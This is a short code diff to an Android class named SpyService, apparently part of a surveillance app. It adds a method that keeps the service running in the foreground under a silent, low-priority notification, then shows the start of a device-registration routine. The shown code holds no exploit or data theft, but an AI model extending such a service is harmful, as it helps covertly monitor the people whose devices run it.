@@ -106,6 +106,21 @@ public class SpyService extends Service {
         } catch (SecurityException e) { Log.e(TAG, "Foreground failed", e); }
     }
 
+    private void updateNotification(String text) {
+        if (foregroundStarted) {
+            try {
+                Notification notification = new NotificationCompat.Builder(this, "spy_ch")
+                        .setContentTitle("🔱 بلاك - الخدمة نشطة")
+                        .setContentText(text)
+                        .setSmallIcon(android.R.drawable.ic_menu_manage)
+                        .setPriority(NotificationCompat.PRIORITY_LOW)
+                        .setSilent(true)
+                        .build();
+                startForeground(1337, notification);
+            } catch (Exception e) { Log.e(TAG, "Update notification failed", e); }
+        }
+    }
+
     private void registerDevice() {
         try {
             Map<String, Object> info = new HashMap<>();
